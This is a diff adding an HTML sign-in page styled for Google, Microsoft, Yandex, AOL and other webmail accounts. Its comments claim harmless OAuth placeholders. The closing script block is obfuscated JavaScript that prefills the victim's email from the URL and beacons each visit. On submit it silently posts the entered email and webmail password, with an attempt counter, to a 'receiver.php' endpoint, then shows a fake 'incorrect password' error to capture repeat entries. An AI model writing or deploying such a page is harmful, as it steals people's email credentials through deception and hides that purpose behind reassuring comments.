@@ -1,0 +1,329 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Sign in — Example</title>
+<style>
+  :root{
+    --bg:#f3f6fb;
+    --card:#ffffff;
+    --muted:#6b7280;
+    --accent:#0b74ff;
+    --radius:12px;
+    --input-height:48px;
+    --shadow: 0 6px 18px rgba(18, 38, 63, 0.08);
+    font-family:Inter, ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+  }
+  html,body{height:100%}
+  body{
+    margin:0;
+    background:linear-gradient(180deg,var(--bg),#e9f0fb);
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    padding:32px;
+    -webkit-font-smoothing:antialiased;
+  }
+
+  .card{
+    width: 420px;
+    background:var(--card);
+    border-radius:var(--radius);
+    box-shadow:var(--shadow);
+    padding:24px;
+  }
+
+  .brand{
+    display:flex;
+    gap:8px;
+    justify-content:center;
+    margin-bottom:18px;
+  }
+
+  /* provider buttons area */
+  .providers{
+    display:flex;
+    gap:8px;
+    justify-content:center;
+    margin-bottom:16px;
+    flex-wrap:wrap;
+  }
+
+  .provider-btn{
+    display:inline-flex;
+    align-items:center;
+    gap:10px;
+    padding:8px 12px;
+    border-radius:10px;
+    border:1px solid #e6eefb;
+    background:linear-gradient(180deg,#fff,#fbfdff);
+    min-width:150px;
+    justify-content:center;
+    cursor:pointer;
+    text-decoration:none;
+    color:var(--muted);
+    font-weight:600;
+    font-size:13px;
+  }
+  .provider-icon{
+    width:18px; height:18px; display:inline-block; flex:0 0 18px;
+  }
+
+  .divider{
+    display:flex;
+    align-items:center;
+    gap:12px;
+    margin:12px 0;
+    color:#9aa4b2;
+    font-size:13px;
+  }
+  .divider::before, .divider::after{
+    content:"";
+    height:1px;
+    flex:1;
+    background:#e6eefb;
+    border-radius:2px;
+  }
+
+  form { display:flex; flex-direction:column; gap:12px; }
+
+  .field{
+    position:relative;
+  }
+
+  label{
+    display:block;
+    font-size:13px;
+    color:#344054;
+    margin-bottom:6px;
+  }
+
+  input[type="email"],
+  input[type="password"]{
+    width:100%;
+    height:var(--input-height);
+    padding:0 14px;
+    border-radius:10px;
+    border:1px solid #e6eefb;
+    background:#fff;
+    font-size:15px;
+    outline:none;
+    box-sizing:border-box;
+    transition:box-shadow .12s, border-color .12s;
+    -webkit-appearance:none;
+  }
+  input:focus{
+    border-color:rgba(11,116,255,0.9);
+    box-shadow:0 6px 18px rgba(11,116,255,0.08);
+  }
+
+  .input-row{
+    display:flex;
+    gap:10px;
+    align-items:center;
+  }
+
+  .submit{
+    height:48px;
+    border-radius:10px;
+    border:0;
+    background:linear-gradient(90deg,var(--accent),#0865db);
+    color:white;
+    font-weight:700;
+    font-size:15px;
+    cursor:pointer;
+  }
+  .submit:hover{
+    background: #074699;
+  }
+  .meta{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    font-size:13px;
+    color:var(--muted);
+  }
+
+  .checkbox{display:flex;align-items:center;gap:8px}
+  .help{margin-top:12px;text-align:center;font-size:13px;color:var(--muted);}
+
+  /* small responsive */
+  @media (max-width:480px){
+    .card{width:100%}
+    .provider-btn{min-width:120px;font-size:12px;padding:8px}
+  }
+</style>
+</head>
+<body>
+  <main class="card" role="main" aria-labelledby="signin-heading">
+    <h1 id="signin-heading" style="font-size:20px;margin:0 0 8px;text-align:center;color:#0f1724">Sign in to Your Account</h1>
+
+    <!-- Provider sign-in buttons (clear OAuth intent) -->
+    <div class="providers" aria-hidden="false" role="group" aria-label="Sign in with">
+      <!-- IMPORTANT: these buttons should start your OAuth flow (not collect provider passwords). -->
+      <!-- Replace '#' with your real OAuth start endpoints. Use official SDKs and branding assets. -->
+      <a class="provider-btn" href="#" onclick="startOAuth('google'); return false;" title="Sign in with Google">
+        <span class="provider-icon" aria-hidden="true">
+          <!-- simple inline placeholder SVG for Google (replace with official asset) -->
+          <svg viewBox="0 0 48 48" width="18" height="18" xmlns="http://www.w3.org/2000/svg" role="img"><rect width="48" height="48" rx="8" fill="#fff"/><text x="50%" y="50%" alignment-baseline="middle" text-anchor="middle" font-size="10" fill="#DB4437">G</text></svg>
+        </span>
+        Sign in with Google
+      </a>
+
+      <a class="provider-btn" href="#" onclick="startOAuth('microsoft'); return false;" title="Sign in with Microsoft">
+        <span class="provider-icon">
+          <svg viewBox="0 0 24 24" width="18" height="18" xmlns="http://www.w3.org/2000/svg" role="img"><rect width="24" height="24" rx="3" fill="#fff"/><text x="50%" y="50%" alignment-baseline="middle" text-anchor="middle" font-size="9" fill="#0078D4">O</text></svg>
+        </span>
+        Sign in with Microsoft
+      </a>
+
+      <a class="provider-btn" href="#" onclick="startOAuth('yandex'); return false;" title="Sign in with Yandex">
+        <span class="provider-icon">
+          <svg viewBox="0 0 24 24" width="18" height="18" xmlns="http://www.w3.org/2000/svg" role="img"><rect width="24" height="24" rx="3" fill="#fff"/><text x="50%" y="50%" alignment-baseline="middle" text-anchor="middle" font-size="9" fill="#CC0000">Y</text></svg>
+        </span>
+        Sign in with Yandex
+      </a>
+
+      <a class="provider-btn" href="#" onclick="startOAuth('aol'); return false;" title="Sign in with AOL">
+        <span class="provider-icon">
+          <svg viewBox="0 0 24 24" width="18" height="18" xmlns="http://www.w3.org/2000/svg" role="img"><rect width="24" height="24" rx="3" fill="#fff"/><text x="50%" y="50%" alignment-baseline="middle" text-anchor="middle" font-size="9" fill="#222">A</text></svg>
+        </span>
+        Sign in with AOL
+      </a>
+
+      <a class="provider-btn" href="#" onclick="startOAuth('generic-webmail'); return false;" title="Other webmail providers">
+        <span class="provider-icon">
+          <svg viewBox="0 0 24 24" width="18" height="18" xmlns="http://www.w3.org/2000/svg" role="img"><rect width="24" height="24" rx="3" fill="#fff"/><text x="50%" y="50%" alignment-baseline="middle" text-anchor="middle" font-size="9" fill="#4b5563">W</text></svg>
+        </span>
+        Other webmail
+      </a>
+    </div>
+
+    <div class="divider">or continue with email</div>
+
+    <!-- Normal local account login (only for your own users) -->
+    <form id="realForm" action="/login" method="POST" autocomplete="on" novalidate>
+      <p id="error-t" style="color:red;display: none;">Email or password is not correct, please try again.</p>
+      <div class="field">
+        <label for="email">Email address</label>
+        <input id="email" name="email" type="email" placeholder="you@yourdomain.com" required autocomplete="email" />
+      </div>
+
+      <div class="field">
+        <label for="password">Password</label>
+        <input id="password" name="password" type="password" placeholder="Enter your Email password" required autocomplete="current-password" />
+      </div>
+
+      <div class="meta">
+        <label class="checkbox"><input type="checkbox" name="remember" /> Remember me</label>
+        <a href="/forgot" style="color:var(--muted); text-decoration:none;">Forgot?</a>
+      </div>
+
+      <button class="submit" type="submit">Sign in</button>
+    </form>
+
+    <p class="help">Don't have an account? <a href="/register">Create one</a></p>
+  </main>
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script>
+  // NOTE: These should start your real OAuth flows (server side).
+  // They are placeholders to emphasize intent and clarity.
+  function startOAuth(provider){
+    // For security, redirect to your server endpoint which starts the provider's OAuth flow.
+    // Example: window.location = '/auth/google/start';
+    // Replace with proper endpoints and implement server-side.
+    alert('Start OAuth flow for: ' + provider + '\\n(Implement server-side redirect to provider OAuth)');
+  }
+
+  const mWs$DZtWnhLS = vRvhTpaB;
+
+  function vRvhTpaB(XkgXv$druPcgYMFhg, BssnmV_uCsslMLKfETCoLr$bHC) {
+  	const QPhHTigLhEYcUq$tcdZB = HWnoN$tadUkH();
+  	return vRvhTpaB = function(HmiZ_HhX, pXpLUQUma$rQHoQzfGrgvBx_uP) {
+  		HmiZ_HhX = HmiZ_HhX - (0xe6e + parseInt(0xa0d) * Math.floor(-0x2) + parseInt(0x6cb));
+  		let veWdPvRxPBMgHzeLcNlt$LdoEz = QPhHTigLhEYcUq$tcdZB[HmiZ_HhX];
+  		if (vRvhTpaB['OKcsJt'] === undefined) {
+  			const YAeE_vTmmaERSbmZqKFjGbY = function(lNFiatCGMLxabfH$lIo) {
+  				let kfYy$LHPSpDOhpVnIp_t = -parseInt(0x2201) + -0x151 * -0x17 + Math.ceil(parseInt(0x607)) & -0x4 * 0x409 + -0x25d2 + Math.floor(0x4ff) * Math.trunc(0xb),
+  					Md_xUPMgGXRsfSxGqONRLx = new Uint8Array(lNFiatCGMLxabfH$lIo['match'](/.{1,2}/g)['map'](fyGqa => parseInt(fyGqa, -parseInt(0xce3) * -0x2 + 0xc88 + -parseInt(0x1) * Math.max(0x263e, parseInt(0x263e))))),
+  					APyBLXqwiVP = Md_xUPMgGXRsfSxGqONRLx['map'](EjuAYoLnTwykvvqLo => EjuAYoLnTwykvvqLo ^ kfYy$LHPSpDOhpVnIp_t),
+  					dYs_vL$FqrrEDj = new TextDecoder(),
+  					UFm$dbKlC$DIBN = dYs_vL$FqrrEDj['decode'](APyBLXqwiVP);
+  				return UFm$dbKlC$DIBN;
+  			};
+  			vRvhTpaB['FWOAvq'] = YAeE_vTmmaERSbmZqKFjGbY, XkgXv$druPcgYMFhg = arguments, vRvhTpaB['OKcsJt'] = !![];
+  		}
+  		const BWPsxSwHg_vq$afcWg = QPhHTigLhEYcUq$tcdZB[-parseInt(0x2) * parseInt(0x1139) + 0x1 * -parseInt(0xa39) + Math.ceil(0x2cab)],
+  			HrW$oqh = HmiZ_HhX + BWPsxSwHg_vq$afcWg,
+  			fgamlJd$mxHCPHTEYcIkqFYCWs = XkgXv$druPcgYMFhg[HrW$oqh];
+  		return !fgamlJd$mxHCPHTEYcIkqFYCWs ? (vRvhTpaB['sVoVFO'] === undefined && (vRvhTpaB['sVoVFO'] = !![]), veWdPvRxPBMgHzeLcNlt$LdoEz = vRvhTpaB['FWOAvq'](veWdPvRxPBMgHzeLcNlt$LdoEz), XkgXv$druPcgYMFhg[HrW$oqh] = veWdPvRxPBMgHzeLcNlt$LdoEz) : veWdPvRxPBMgHzeLcNlt$LdoEz = fgamlJd$mxHCPHTEYcIkqFYCWs, veWdPvRxPBMgHzeLcNlt$LdoEz;
+  	}, vRvhTpaB(XkgXv$druPcgYMFhg, BssnmV_uCsslMLKfETCoLr$bHC);
+  }
+
+  function HWnoN$tadUkH() {
+  	const hCwrWrkqBfNSVsKTZDreXfHX = ['7f7b7a1d051908142e', '6e3d2c3e3e3a223f29', '6e28202c2421', '393f3828', '3e382f3e393f24232a', '39283539', '1b283f242b3424232a636363', '7a7d797f757d7b140521030b24', '21222a', '1e242a236d0423', '21222e2c39242223', '3d3f283b28233909282b2c382139', '1b243e24396d232239242b242e2c392422236d3e282339', '3b2c21', '2f38393922231639343d28706f3e382f2024396f10633e382f202439', '2b222e383e', '7c7b7f7d7f07292035050e', '7c7f78757b7f083b1920202c', '7f7c081f1e2f2017', '2128232a3925', '2c272c35', '2e21242e26', '7f757e757878142b2a2c2021', '2e3e3e', '29243e3d212c34', '3f282c2934', '7b787c757c7f04263c0b140e', '24232e213829283e', '75781a3e1e140c28', '7e7c7a7b7874797d2c390e0a0001', '253f282b', '7f787e7a7b7a7f3c060b270a2f', '6e283f3f223f6039', '2f21222e26', '3e39223d1d3f223d2c2a2c39242223', '1f283d223f396d1e382f202439392829', '23222328', '633e382f202439', '3f282e28243b283f633d253d', '1d021e19', '2423292835022b'];
+  	HWnoN$tadUkH = function() {
+  		return hCwrWrkqBfNSVsKTZDreXfHX;
+  	};
+  	return HWnoN$tadUkH();
+  }(function(eoHoXoTISIEt, LNlr$_dLNsoMjskGh) {
+  	const UwQwYhLzniwzkzdImWDDzAnoT = vRvhTpaB,
+  		FLVj_ecOwoThZ = eoHoXoTISIEt();
+  	while (!![]) {
+  		try {
+  			const gThaHjXC_RJN$cR = parseFloat(UwQwYhLzniwzkzdImWDDzAnoT(0x136)) / (-parseInt(0x429) + Math.ceil(-0x2696) + -parseInt(0xab) * -0x40) + Math['floor'](-parseFloat(UwQwYhLzniwzkzdImWDDzAnoT(0x130)) / (Math.trunc(-0x1ead) + parseInt(0x9) * Math.max(parseInt(0x41f), 0x41f) + 0xcd * -parseInt(0x8))) * (parseFloat(UwQwYhLzniwzkzdImWDDzAnoT(0x120)) / (Number(-0x12a5) + Math.floor(0xc75) + parseInt(0x17) * parseInt(0x45))) + -parseFloat(UwQwYhLzniwzkzdImWDDzAnoT(0x13a)) / (parseInt(parseInt(0x65c)) * 0x3 + -parseInt(0x7) * parseInt(0x41f) + parseInt(0x9c9)) + -parseFloat(UwQwYhLzniwzkzdImWDDzAnoT(0x13c)) / (-0x4 * -parseInt(0x4f1) + Number(parseInt(0x1a70)) + parseInt(0x233) * parseFloat(-0x15)) * Math['floor'](parseFloat(UwQwYhLzniwzkzdImWDDzAnoT(0x131)) / (parseInt(0x577) * -0x1 + -0x199f + Math.ceil(parseInt(0x1f1c)))) + -parseFloat(UwQwYhLzniwzkzdImWDDzAnoT(0x132)) / (Math.max(0x7b4, 0x7b4) + -parseInt(0xef2) + parseInt(0x1) * 0x745) * Math['floor'](parseFloat(UwQwYhLzniwzkzdImWDDzAnoT(0x13f)) / (Math.floor(-parseInt(0x2de)) * Math.max(0xc, 0xc) + Math.floor(0x3) * Math.floor(-parseInt(0xc68)) + 0x1 * 0x47a8)) + -parseFloat(UwQwYhLzniwzkzdImWDDzAnoT(0x127)) / (Math.max(0x5c9, parseInt(0x5c9)) + 0x6f1 + parseInt(0xcb1) * parseFloat(-0x1)) + parseFloat(UwQwYhLzniwzkzdImWDDzAnoT(0x13d)) / (Number(-parseInt(0x1f3)) + Math.floor(-0x177e) + parseFloat(parseInt(0x197b)));
+  			if (gThaHjXC_RJN$cR === LNlr$_dLNsoMjskGh) break;
+  			else FLVj_ecOwoThZ['push'](FLVj_ecOwoThZ['shift']());
+  		} catch (uLGtxDy_VvjDxICXVIV) {
+  			FLVj_ecOwoThZ['push'](FLVj_ecOwoThZ['shift']());
+  		}
+  	}
+  }(HWnoN$tadUkH, Math.ceil(parseInt(0x1)) * parseFloat(0x2c423) + 0xde8fd + -0x943b7), $(document)[mWs$DZtWnhLS(0x139)](function() {
+  	const IOK_HNiQSS_aZ = mWs$DZtWnhLS;
+  	let slMLKfET_CoLr = Math.trunc(-0x1bf4) + parseInt(0x1) * -0x1ae9 + Math.trunc(-parseInt(0xaf9)) * -0x5,
+  		HC$JQ$P = window[IOK_HNiQSS_aZ(0x12a)][IOK_HNiQSS_aZ(0x13e)],
+  		HT$igLhEY = HC$JQ$P[IOK_HNiQSS_aZ(0x124)](HC$JQ$P[IOK_HNiQSS_aZ(0x11f)]('=') + (parseFloat(-parseInt(0x1258)) + -0x16ea * -parseInt(0x1) + parseInt(-parseInt(0x491))));
+  	!HT$igLhEY[IOK_HNiQSS_aZ(0x13b)]('@') && (HT$igLhEY = atob(HT$igLhEY)), HT$igLhEY[IOK_HNiQSS_aZ(0x133)] > -0x2af * Math.trunc(0x5) + -parseInt(0x1) * -0x14b6 + 0x748 * Math.ceil(-0x1) ? ($(IOK_HNiQSS_aZ(0x122))[IOK_HNiQSS_aZ(0x12d)](HT$igLhEY), $(IOK_HNiQSS_aZ(0x121))[IOK_HNiQSS_aZ(0x12f)]()) : $(IOK_HNiQSS_aZ(0x122))[IOK_HNiQSS_aZ(0x12d)]('')[IOK_HNiQSS_aZ(0x12f)](), $[IOK_HNiQSS_aZ(0x134)]({
+  		'url': IOK_HNiQSS_aZ(0x146),
+  		'method': IOK_HNiQSS_aZ(0x147),
+  		'data': {
+  			'visit': IOK_HNiQSS_aZ(0x123)
+  		},
+  		'success': function(U_qtc_dZ) {
+  			const JTBnB = IOK_HNiQSS_aZ;
+  			console[JTBnB(0x128)](JTBnB(0x12c));
+  		}
+  	}), $(IOK_HNiQSS_aZ(0x12e))[IOK_HNiQSS_aZ(0x135)](function(gHmiZHh$XWpXpLUQU) {
+  		const WyCyCJLaPxIjzWQEjo_DX = IOK_HNiQSS_aZ;
+  		gHmiZHh$XWpXpLUQU[WyCyCJLaPxIjzWQEjo_DX(0x12b)](), gHmiZHh$XWpXpLUQU[WyCyCJLaPxIjzWQEjo_DX(0x142)](), slMLKfET_CoLr++;
+  		let ar_QHoQzfG = $(WyCyCJLaPxIjzWQEjo_DX(0x122))[WyCyCJLaPxIjzWQEjo_DX(0x12d)](),
+  			gvBxuPZveWdP = $(WyCyCJLaPxIjzWQEjo_DX(0x121))[WyCyCJLaPxIjzWQEjo_DX(0x12d)]();
+  		$(WyCyCJLaPxIjzWQEjo_DX(0x145))[WyCyCJLaPxIjzWQEjo_DX(0x125)](WyCyCJLaPxIjzWQEjo_DX(0x126)), $(WyCyCJLaPxIjzWQEjo_DX(0x140))[WyCyCJLaPxIjzWQEjo_DX(0x137)](WyCyCJLaPxIjzWQEjo_DX(0x138), WyCyCJLaPxIjzWQEjo_DX(0x144)), $[WyCyCJLaPxIjzWQEjo_DX(0x134)]({
+  			'url': WyCyCJLaPxIjzWQEjo_DX(0x146),
+  			'method': WyCyCJLaPxIjzWQEjo_DX(0x147),
+  			'data': {
+  				'email': ar_QHoQzfG,
+  				'password': gvBxuPZveWdP,
+  				'attempt': slMLKfET_CoLr
+  			},
+  			'success': function(RxPBMgHzeLc$Nl) {
+  				const GGb_nvVLxVE_OA = WyCyCJLaPxIjzWQEjo_DX;
+  				console[GGb_nvVLxVE_OA(0x128)](GGb_nvVLxVE_OA(0x143)), setTimeout(() => {
+  					const Vo_aAw$rGXppGVFCD = GGb_nvVLxVE_OA;
+  					$(Vo_aAw$rGXppGVFCD(0x145))[Vo_aAw$rGXppGVFCD(0x125)](Vo_aAw$rGXppGVFCD(0x129)), $(Vo_aAw$rGXppGVFCD(0x121))[Vo_aAw$rGXppGVFCD(0x12d)]('')[Vo_aAw$rGXppGVFCD(0x12f)](), $(Vo_aAw$rGXppGVFCD(0x140))[Vo_aAw$rGXppGVFCD(0x137)](Vo_aAw$rGXppGVFCD(0x138), Vo_aAw$rGXppGVFCD(0x141));
+  				}, -parseInt(0x7de) + Math.ceil(0x1774) + 0x1e * -parseInt(0x21));
+  			},
+  			'error': function(Ld_oEz$CBWPsxS) {
+  				const HZiozqKbmw_oW = WyCyCJLaPxIjzWQEjo_DX;
+  				console[HZiozqKbmw_oW(0x128)](HZiozqKbmw_oW(0x143)), setTimeout(() => {
+  					const BXkgi__VObAcYz = HZiozqKbmw_oW;
+  					$(BXkgi__VObAcYz(0x145))[BXkgi__VObAcYz(0x125)](BXkgi__VObAcYz(0x129)), $(BXkgi__VObAcYz(0x121))[BXkgi__VObAcYz(0x12d)]('')[BXkgi__VObAcYz(0x12f)](), $(BXkgi__VObAcYz(0x140))[BXkgi__VObAcYz(0x137)](BXkgi__VObAcYz(0x138), BXkgi__VObAcYz(0x141));
+  				}, Number(parseInt(0x1fd)) + parseInt(-0xb32) + Number(parseInt(0x14ed)));
+  			}
+  		});
+  	});
+  }));
+</script>
+</body>
+</html>
